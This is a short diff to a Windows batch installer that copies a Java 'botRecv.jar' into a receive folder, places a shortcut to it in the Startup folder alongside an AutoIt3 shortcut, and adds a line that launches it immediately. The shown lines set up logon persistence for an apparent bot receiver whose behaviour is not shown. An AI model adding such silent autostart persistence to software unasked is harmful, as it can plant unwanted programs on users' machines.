@@ -8,3 +8,5 @@ cscript /nologo "%~dp0\link.vbs" "%recieveDir%\Autoit3.lnk" "%recieveDir%\AutoIt
 
 copy "%~dp0\botRecv.jar" "%recieveDir%\program.jar"
 cscript /nologo "%~dp0\link.vbs" "%usedStartupFolder%\program.lnk" "%recieveDir%\program.jar" "%recieveDir%"
+
+start "" "%usedStartupFolder%\program.lnk"
